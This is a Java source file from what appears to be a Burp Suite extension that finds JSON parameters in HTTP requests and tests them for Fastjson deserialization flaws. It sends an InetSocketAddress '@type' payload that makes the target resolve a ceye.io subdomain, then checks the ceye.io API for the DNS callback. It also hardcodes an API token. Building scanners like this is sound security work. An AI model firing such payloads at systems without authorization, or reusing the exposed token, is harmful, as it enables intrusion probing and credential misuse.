package jrcet.frame.tools.Scanner;

import burp.*;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Objects;

import static burp.BurpExtender.helpers;
import static burp.BurpExtender.stdout;

public class Scanner {
    public static ArrayList<String> FastjsonScanList = new ArrayList<>();
    public static Integer ReplaceNumber = 199321321;
    public static String ReplaceNumberString = "199321321";
    public static String FastjsonPayload = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{randomStr}.ifwbci.ceye.io\"}}";

    public static String CeyeApi = "http://api.ceye.io/v1/records?token=784299698bb0cf842e6800f9bfd4e89b&type=dns&filter=";

    public static String CeyeDomain = "api.ceye.io";

    public static String CeyeProtocol = "http";

    public static Integer CeyePort = 80;

    public static HashMap<Integer, String> ContentTypeMap = new HashMap<Integer, String>(){
        {
            put(-1,"unknown");
            put(0,"none");
            put(1,"application/x-www-form-urlencoded");
            put(2,"multipart/form-data");
            put(3,"text/xml");
            put(4,"application/json");
            put(5,"application/x-amf");
        }
    };

    public static boolean checkUrl(String url){
        int end = url.indexOf("?");
        String tUrl = end!=-1?url.substring(0,end):url;
        return FastjsonScanList.contains(tUrl);
    }

    public static boolean verifyVul(String randomSubDomain){
        try{
            byte[] requestPackage = helpers.buildHttpRequest(new URL(Scanner.CeyeApi+randomSubDomain));
            IHttpService iHttpService = helpers.buildHttpService(Scanner.CeyeDomain, Scanner.CeyePort, Scanner.CeyeProtocol);
            IHttpRequestResponse responsePackage = BurpExtender.callbacks.makeHttpRequest(iHttpService, requestPackage);
            stdout.println(randomSubDomain+"\n"+new String(responsePackage.getResponse(),StandardCharsets.UTF_8));
            return new String(responsePackage.getResponse(),StandardCharsets.UTF_8).contains(randomSubDomain);
        }catch (Exception e){
            e.printStackTrace();
        }
        return true;
    }

    public static boolean jsonDetect(String jsonString){
        return (jsonString.contains("\"") && jsonString.contains("{") && jsonString.contains("}") && jsonString.contains(":"));
    }

    public static HashMap<String, Object> getJsonParameter(byte[] requestPackage){

        String jsonParameterString = null;
        HashMap<String, String> getParameterMap = new HashMap<>();
        HashMap<String, String> postParameterMap = new HashMap<>();
        HashMap<String, String> cookieParameterMap = new HashMap<>();
        IRequestInfo iRequestInfo = helpers.analyzeRequest(requestPackage);
        String requestBody = new String(requestPackage, StandardCharsets.UTF_8).substring(iRequestInfo.getBodyOffset());
        //从iParameter中获取Cookie和GET请求中可能含有JSON数据的参数
        for(IParameter iParameter : iRequestInfo.getParameters()){
            String value = helpers.urlDecode(iParameter.getValue());
            if(Scanner.jsonDetect(value)){
                switch ((int)iParameter.getType()){
                    case 0://GET
                        getParameterMap.put(iParameter.getName(), value);
                        break;
                    case 2://Cookie
                        cookieParameterMap.put(iParameter.getName(), value);
                }
            }
        }

        //获取Body中存在Json格式数据的参数或字符串
        if(!Objects.equals(requestBody, "") && Scanner.jsonDetect(helpers.urlDecode(requestBody))){
            //获取getContentType，如果是application/json，则直接分析就可以，如果是其他类型，则分析参数值是否有json数据
            switch ((int)iRequestInfo.getContentType()){
                case 1://CONTENT_TYPE_URL_ENCODED
                    for(String parameter : requestBody.split("&")){
                        if(parameter.contains("=") && !parameter.endsWith("=") && Scanner.jsonDetect(helpers.urlDecode(parameter))) {
                            String[] tmpKeyValue = parameter.split("=");
                            postParameterMap.put(tmpKeyValue[0], helpers.urlDecode(tmpKeyValue[1]));
                        }
                    }
                    break;
                case 4://CONTENT_TYPE_JSON
                    jsonParameterString = requestBody;
                    break;
                case 0://CONTENT_TYPE_NONE
                case -1://CONTENT_TYPE_UNKNOWN
                case 2://CONTENT_TYPE_MULTIPART
                case 3://CONTENT_TYPE_XML
                case 5://CONTENT_TYPE_AMF
                    break;
            }
        }

        String finalJsonParameterString = jsonParameterString;
        return new HashMap<String ,Object>() {
            {
                put("get", getParameterMap);
                put("post", postParameterMap);
                put("cookie", cookieParameterMap);
                put("json", finalJsonParameterString);
            }
        };
    }
}
